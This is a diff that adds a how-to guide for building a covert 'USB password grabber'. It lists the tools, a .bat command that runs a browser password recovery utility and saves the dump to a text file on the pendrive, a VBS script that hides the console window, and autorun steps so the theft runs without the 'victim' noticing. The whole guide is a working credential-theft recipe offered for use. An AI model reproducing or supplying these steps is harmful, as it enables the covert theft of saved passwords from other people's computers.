@@ -1,0 +1,42 @@
+I AM NOT RESPNOSIBLE FOR ANY MISLEADING THINGS YOU HAVE COMMITED 
+
+Tools required 
+1) A usb pendrive 
+2) windows password recovery sofware
+  ( https://www.nirsoft.net/utils/web_browser_password.html)
+  this is the link to download the software
+3) USB AUTO RUN SOFTWARE (https://usb-autorun-creator.en.softonic.com/)
+
+4) need a windows computer for creating a .bat file 
+
+Process:
+1) install all the software that are mentioned before
+
+2) connect the usb pendrive to the computer
+
+3) Copy the windows password recovery sofware into the pendrive
+
+4) Now we have to create a .bat file to run the software automatically and save in a .txt file 
+
+ start WebBrowserPassView.exe /stext password.txt
+
+5) save it any name you want but you must include the .bat extension
+
+6) at this point the "password grabber" is ready you just need to connect to the usb to your victim machine and run the .bat file just within 3 to 5 seconds a file will save it your pendrive that is the passwords of the victim machine
+
+IF YOU WANT TO TAKE IT TO NEXT LEVEL LIKE AUTOMATION AND NO CMD PANEL OPENING THEN CONTINUE ......
+1) Now we have to automate the process in the above method there are 2 problems 
+    1. you need the run the .bat file by yourself 
+    2. when you run the .bat file there is going to be a cmd panel open which is very risky and your victim might notice
+
+2)  SO in that case we need to create another file, Open a empty notepad and type the following script
+
+Set WshShell = CreateObject("WScript.Shell") 
+WshShell.Run chr(34) & "REPLACE THIS PLACE WITH YOUR .BAT FILE AND USB DRIVE NAME LIKE IT IS D: OR C: ETC" & Chr(34), 0
+Set WshShell = Nothing
+
+3) Save the file with .VBS extension, say launch_bat.vbs  (make sure you save the file in the usb drive)
+
+4) open the usb auto run tool then select the drive and select the launch_bat.vbs file (this software  is going to auto run the seleted file )
+
+5) then thats it you have succesfully created a usb password grabber 
